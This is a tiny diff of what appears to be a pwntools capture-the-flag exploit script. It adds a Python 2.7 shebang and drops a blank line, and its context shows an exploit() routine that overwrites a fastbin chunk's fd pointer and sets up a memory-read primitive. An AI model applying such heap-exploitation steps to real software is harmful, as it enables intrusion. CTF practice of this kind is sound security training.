@@ -1,3 +1,4 @@
+#!/usr/bin/python2.7
 from pwn import *
 
 FLAG = 'thisiflag'
@@ -155,7 +156,6 @@ def exploit():
     # now D's user structure stick with first message structure
     create('D', 'D')
     login('D', 'D')
-
 
     # trigger by overwritting fastbin chunk's fd
     def read(addr, size=8):
